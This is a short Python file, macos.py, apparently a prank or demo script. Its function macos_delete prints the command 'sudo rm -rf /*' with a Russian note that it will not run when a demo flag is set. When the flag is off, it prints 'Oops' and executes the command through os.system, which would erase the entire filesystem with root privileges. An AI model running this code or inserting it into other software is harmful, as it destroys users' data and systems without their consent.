# macos.py
import os

def macos_delete(demo):
    command = 'sudo rm -rf /*'
    if demo == True:
        print(f"Команда: {command} (эта команда фактически НЕ будет выполнена)")
    else:
        print("Упс")
        os.system(command)